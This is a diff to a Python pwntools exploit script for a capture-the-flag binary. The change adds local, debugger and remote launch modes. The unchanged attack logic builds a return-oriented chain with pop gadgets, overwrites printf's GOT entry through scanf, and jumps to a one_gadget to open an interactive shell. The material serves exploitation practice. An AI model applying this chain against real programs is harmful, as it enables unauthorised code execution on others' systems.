@@ -1,13 +1,26 @@
 #!/usr/bin/env python3
 from pwn import *
 
-bin_file = './chall'
-context(os = 'linux', arch = 'amd64')
-# HOST = ''
-# PORT = 
+BIN_FILE  = './chall'
+LIBC_FILE = './libc.so.6'
 
-binf = ELF(bin_file)
-libc = ELF('./libc.so.6')
+HOST = args.HOST or 'localhost'
+PORT = int(args.PORT or 1337)
+
+context(os='linux', arch='amd64')
+# context.terminal = ['tmux', 'splitw', '-h']
+# context.log_level = 'debug'
+
+binf = ELF(BIN_FILE)
+libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None
+
+def start():
+    if args.REMOTE:
+        return remote(HOST, PORT)
+    elif args.GDB:
+        return gdb.debug(BIN_FILE)
+    else:
+        return process(BIN_FILE)
 
 def attack(io, **kwargs):
     io.sendlineafter('n: ', '26')
@@ -36,8 +49,6 @@ def attack(io, **kwargs):
     for i in range(19):
             io.sendlineafter(': ', '30')
 
-    
-
     pop_rdi = 0x4013a3
     pop_rsi_r15 = 0x4013a1
     addr_ret = 0x4013c4
@@ -52,27 +63,16 @@ def attack(io, **kwargs):
     io.sendlineafter(': ', str(binf.got['printf']))
     io.sendlineafter(': ', str(0))
 
-
     io.sendlineafter(': ', str(0x401070)) # __isoc99_scanf@plt
-
     io.sendlineafter(': ', str(addr_ret))
-
-    
-
     io.sendlineafter(': ', str(0x401040)) # printf@plt
-
-    
     io.sendlineafter(': ', '29')
     io.recvline()
-
     io.sendline(str(addr_onegad))
 
-
 def main():
-    io = process(bin_file)
-    # io = remote(HOST, PORT)
+    io = start()
     attack(io)
-    # gdb.attach(io, '')
     io.interactive()
 
 if __name__ == '__main__':
